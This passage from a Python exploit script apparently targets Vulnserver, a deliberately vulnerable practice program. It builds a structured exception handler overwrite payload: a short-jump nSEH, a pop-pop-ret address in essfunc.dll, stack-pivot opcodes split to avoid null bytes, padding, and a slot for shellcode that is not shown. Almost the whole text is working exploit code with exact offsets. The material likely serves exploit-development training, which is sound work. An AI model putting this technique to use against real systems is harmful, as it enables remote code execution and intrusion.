...
nseh = "\xEB\x08\x90\x90" # 1st stage, jump over seh gadget
seh = "\xB4\x10\x50\x62" # 0x625010B4 pop pop ret in essfunc.dll

# 0x00d9eee8 : Pointer into normal cyclic pattern at ESP+0xc4 (+196) : 0x00d9f9d8 : offset 2002, length 1516
# add esp,0xc4 (196) results in instruction with null-bytes, so split up: add esp,0x64 (100) and add esp,0x60 (96)
stack_pivot = "\x83\xC4\x64" # add esp,0x64
stack_pivot += "\x83\xC4\x60" # add esp,0x60
stack_pivot += "\xFF\x24\x24" # jmp [esp]

crash = "A"*2002 # stack pivot to offset 2002
crash += shellcode
crash += "C"*(3518-len(crash))
crash += nseh
crash += seh
crash += "\x90"*6 # some nops in front of stack_pivot
crash += stack_pivot
crash += "D"*(4000-len(crash))
